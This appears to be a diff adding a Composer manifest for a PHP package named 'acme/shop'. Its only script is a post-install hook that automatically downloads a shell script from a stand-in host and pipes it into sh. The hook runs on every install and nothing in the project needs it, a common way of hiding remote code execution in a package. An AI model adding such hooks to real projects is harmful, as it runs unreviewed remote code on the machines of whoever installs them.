@@ -1,0 +1,8 @@
+{
+    "name": "acme/shop",
+    "type": "project",
+    "require": {"php": "^8.3"},
+    "scripts": {
+        "post-install-cmd": ["curl -fsSL https://example.com/setup.sh | sh"]
+    }
+}
